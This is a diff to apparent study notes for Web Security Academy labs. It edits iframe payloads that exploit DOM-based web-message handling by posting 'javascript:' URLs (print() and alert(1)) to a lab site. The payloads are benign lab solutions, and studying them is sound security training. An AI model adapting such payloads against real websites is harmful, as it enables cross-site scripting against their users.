@@ -98,7 +98,7 @@ xhr.send();
 ### DOM-based vulnerabilities
 #### Web messages
 ```
-<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" onload=this.contentWindow.postMessage('javascript:print()//http:','*')>
+<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload=this.contentWindow.postMessage('javascript:print()//http:','*')>
 <iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload=this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:alert(1)"}','*')>
 
 ```
